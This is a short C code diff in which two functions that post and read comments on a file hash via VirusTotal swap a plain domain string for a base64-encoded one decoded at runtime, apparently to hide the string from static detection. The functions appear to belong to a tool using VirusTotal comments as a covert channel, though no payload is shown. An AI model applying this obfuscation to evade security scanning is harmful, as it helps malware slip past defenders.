@@ -170,7 +170,14 @@ char* PostComment(char* APIkey, char* Hash, char* comment)
     {
         return Error("Failed in InternetOpenA");
     }
-    char domain[] = { 'w','w','w','.','v','i','r','u','s','t','o','t','a','l','.','c','o','m',0 };
+    //char domain[] = { 'w','w','w','.','v','i','r','u','s','t','o','t','a','l','.','c','o','m',0 };
+    size_t  out_len = b64_decoded_size("d3d3LnZpcnVzdG90YWwuY29t") + 1;
+    char* domain = (char*)malloc(out_len);
+    if (!b64_decode("d3d3LnZpcnVzdG90YWwuY29t", (unsigned char*)domain, out_len)) {
+        printf("(NULL)\n");
+    }
+    domain[out_len - 1] = '\0';
+    
     HINTERNET hConnect = InternetConnectA(hInternet, domain, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
     if (!hConnect)
     {
@@ -232,7 +239,14 @@ char* GetComment(char* APIkey, char* Hash)
     {
         return Error("Failed in InternetOpenA");
     }
-    char domain[] = { 'w','w','w','.','v','i','r','u','s','t','o','t','a','l','.','c','o','m',0 };
+    //char domain[] = { 'w','w','w','.','v','i','r','u','s','t','o','t','a','l','.','c','o','m',0 };
+    size_t  out_len = b64_decoded_size("d3d3LnZpcnVzdG90YWwuY29t") + 1;
+    char* domain = (char*)malloc(out_len);
+    if (!b64_decode("d3d3LnZpcnVzdG90YWwuY29t", (unsigned char*)domain, out_len)) {
+        printf("(NULL)\n");
+    }
+    domain[out_len - 1] = '\0';
+    
     HINTERNET hConnect = InternetConnectA(hInternet, domain, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
     if (!hConnect)
     {
